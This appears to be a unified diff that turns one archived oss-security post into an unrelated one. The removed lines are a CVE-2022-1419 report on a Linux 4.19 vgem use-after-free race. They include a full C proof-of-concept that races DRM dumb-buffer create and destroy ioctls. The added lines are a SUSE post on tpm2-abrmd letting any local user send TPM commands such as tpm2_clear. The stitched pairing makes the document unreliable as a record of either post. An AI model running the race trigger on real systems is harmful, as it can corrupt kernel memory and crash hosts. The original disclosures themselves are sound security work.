@@ -1,100 +1,98 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/21/1
-Message-ID: <CAH5WSp5hx0pPjhbUoyduc-Nk7fW12pLsJqBFFQ9S4p7ZdgkHcg@mail.gmail.com>
-Date: Thu, 21 Apr 2022 23:44:54 +0800
-From: Minh Yuan <yuanmingbuaa@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/20/3
+Message-ID: <Yl/NNAMZpGvD1c09@f195.suse.de>
+Date: Wed, 20 Apr 2022 11:07:00 +0200
+From: Matthias Gerstner <mgerstner@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2022-1419: Linux kernel: A concurrency use-after-free in vgem_gem_dumb_create
+Subject: tpm2-abrmd: possibly surprising security model for local users could result in a local DoS against TPM configuration and data
 Content-Type: text/plain; charset=utf-8
 
-Hi guys,
+Hello list,
 
-I recently discovered a race uaf in the latest 4.19.y kernel ( v4.19.239
-for now ).
+this is both a heads up and an invitation for discussion of a situation
+that some end users and TPM integrators might find surprising.
 
-The root cause of this vulnerability is that the
-ioctl$DRM_IOCTL_MODE_DESTROY_DUMB can decrease refcount of
-*drm_vgem_gem_object *(created in *vgem_gem_dumb_create*) concurrently,
-and  *vgem_gem_dumb_create *will access the freed drm_vgem_gem_object.
+The Intel TPM 2.0 software stack offers software components for
+accessing TPM 2.0 hardware features. The stack's main components are the
+core libraries tpm2-tss [1], a set of command line tools tpm2-tools [2]
+and the userspace resource manager and access broker tpm2-abrmd [3] used
+for multiplexing parallel access to a TPM device.
 
-I noticed that this race issue is fixed in commit 4b848f2 (drm/vgem: Close
-use-after-free race in vgem_gem_create) for linux 5.x, so a backport to
-4.19.y is needed  ...
+I was made aware that, after installing all three of the mentioned
+tpm2 packages on openSUSE, arbitrary local users may issue arbitrary
+commands to the TPM chip [4], including a `tpm2_clear` operation. The
+reporter of this was afraid that this could be used as a local
+denial-of-service vector especially in the light of recent feature
+developments like TPM assisted unattended unlocking of encrypted file
+systems during boot.
 
-My unstable PoC (tested on Linux 4.19.239, it needs the privilege to access
-drm to trigger this bug.)
+The Intel TPM 2.0 software stack supports different communication
+backends (TCTIs, TPM Command Transmission Interfaces) for accessing a
+TPM device. For example the tcti-device backend accesses the /dev/tpm0
+character device directly while tcti-tabrmd attempts to invoke the D-Bus
+interface of the tpm2-abrmd daemon. The packaging of tpm2-abrmd in
+openSUSE uses configuration files to allow transparent autostart of the
+daemon via D-Bus [5] and to allow everybody to invoke the service's
+D-Bus methods via the D-Bus service configuration [6].
 
-#include <endian.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-#include <sys/mman.h>
-#include <pthread.h>
-#include <sys/xattr.h>
-#include <sys/shm.h>
-#include <linux/userfaultfd.h>
-#include <poll.h>
-#include <sys/ioctl.h>
-#include <drm/drm.h>
-#include <drm/drm_mode.h>
+What happens is that upon invocation of a tpm2-tools command, even by a
+regular system user (even a user like 'nobody'), different TCTI
+backends will be probed by the tool. The probing of the tcti-tabrmd will
+cause the tpm2-abrmd service to be started, even if not enabled on
+systemd level. Since there are no restrictions on D-Bus level and no
+further authentication layers exist on top of it, the operation will
+succeed.
 
-#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
-} while (0)
-int fd;
-void *thread1(void *arg)
-{
-struct drm_mode_create_dumb *args = (struct drm_mode_create_dumb *)malloc(
-sizeof(struct drm_mode_create_dumb));
-memset(args,0,sizeof(struct drm_mode_create_dumb));
-args->width = 10;
-args->height = 10;
-args->bpp = 1;
-ioctl(fd, DRM_IOCTL_MODE_CREATE_DUMB, args);
-}
-void *thread2(void *arg)
-{
-struct drm_mode_destroy_dumb *args = (struct drm_mode_destroy_dumb *)malloc(
-sizeof(struct drm_mode_destroy_dumb));
-memset(args,0,sizeof( struct drm_mode_destroy_dumb));
-args->handle = 1;
-ioctl(fd, DRM_IOCTL_MODE_DESTROY_DUMB, args);
+The /dev/tpm0 character device is typically owned by root:root (mode
+0700) or root:tss (mode 0770) and does not allow world access. Thus
+without tpm2-abrmd installed, arbitrary local users are *not* able to
+issue TPM commands. I contacted upstream about their security model in
+this regard and the statement is that they purely rely on the
+cryptographic security provided by the TPM itself. This means to avoid
+arbitrary local users being able to e.g. reset TPM state, the respective
+TPM properties would need to be protected by TPM level authorization.
+The /dev/tpm0 device should still not be world accessible, because
+otherwise the TPM device itself could suffer from a local DoS. The
+tpm2-abrmd implements measures against the latter.
 
-}
+Upstream told me that they considered to implement e.g. polkit
+authorization for individual actions in tpm2-abrmd but in the end
+decided against it as they did not see a clear benefit for integrators.
 
-int main(void)
+I generally agree with upstream in that properly setup TPM level
+authorization will prevent any local DoS issues. On the other hand I
+found that many people seem to find this situation surprising. Tests
+on other Linux distributions like Debian or Fedora show that they
+exhibit the same behaviour when all three mentioned tpm2 packages are
+installed. Thus integrators might want to reduce the level of surprise
+for some of their users. This can be done relatively simple by
+restricting the D-Bus level access to members of a separate group, for
+example. Upstream recommends *not* to use the same 'tss' group for this
+as is used for group ownership of /dev/tpm0, because this would
+introduce DoS issues against the kernel level device again.
 
-{
-pthread_t thr1,thr2;
-fd = open("/dev/dri/card0",0);
+Upstream stresses the point that this is not a known vulnerability. I
+still would be interested to hear further opinions on this.
 
-int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
-if(s != 0)
-errExit("pthread_create");
-s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
-if(s != 0)
-errExit("pthread_create");
-pthread_join(thr1,NULL);
-pthread_join(thr2,NULL);
+Best Regards
 
-close(fd);
+Matthias
 
-}
+[1]: https://github.com/tpm2-software/tpm2-tss
+[2]: https://github.com/tpm2-software/tpm2-tools
+[3]: https://github.com/tpm2-software/tpm2-abrmd
+[4]: https://bugzilla.suse.com/show_bug.cgi?id=1197532
+[5]: https://github.com/tpm2-software/tpm2-abrmd/blob/master/dist/com.intel.tss2.Tabrmd.service
+[6]: https://github.com/tpm2-software/tpm2-abrmd/blob/master/dist/tpm2-abrmd.conf
 
+-- 
+Matthias Gerstner <matthias.gerstner@...e.de>
+Security Engineer
+https://www.suse.com/security
+GPG Key ID: 0x14C405C971923553
+ 
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG Nürnberg
+Geschäftsführer: Ivo Totev
 
-Timeline:
-* 21.04.22 - Vulnerability reported to security@...nel.org and
-linux-distros@...openwall.org
-* 21.04.22 - CVE-2022-1419 assigned.
-* 21.04.22 - Vulnerability opened.
-
-Regards,
-
-Yuan Ming from Tsinghua University
-
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
